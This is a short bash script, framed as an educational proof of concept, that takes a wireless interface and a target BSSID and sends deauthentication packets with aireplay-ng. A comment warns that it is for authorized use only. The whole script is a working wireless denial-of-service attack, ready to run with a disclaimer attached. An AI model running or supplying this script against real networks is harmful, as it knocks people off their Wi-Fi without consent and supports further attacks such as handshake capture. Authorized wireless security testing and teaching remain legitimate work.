#!/bin/bash
# Educational Proof of Concept: WiFi Deauther
# WARNING: This script must only be used in a controlled, authorized environment.
# Unauthorized deauthentication of network devices is illegal and unethical.
#
# Usage: ./wifi_deauther.sh <interface> <target_bssid>
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <interface> <target_bssid>"
  exit 1
fi

INTERFACE=$1
TARGET_BSSID=$2
echo "Sending deauthentication packets to $TARGET_BSSID on interface $INTERFACE..."
sudo aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$INTERFACE"
echo "Deauthentication attempt complete."
